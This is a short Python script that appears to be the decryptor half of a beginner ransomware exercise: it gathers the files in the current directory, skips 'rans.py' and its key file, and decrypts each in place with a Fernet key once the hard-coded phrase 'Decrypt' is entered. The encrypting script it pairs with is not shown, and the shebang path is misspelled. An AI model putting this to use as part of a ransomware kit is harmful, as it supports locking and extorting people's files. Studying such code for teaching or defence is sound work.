#!/user/bin/env python3
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "rans.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "Decrypt"
user_phrase = input("Enter phrase to decrypt\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Decrypted")
else:
	print("Wrong phrase")
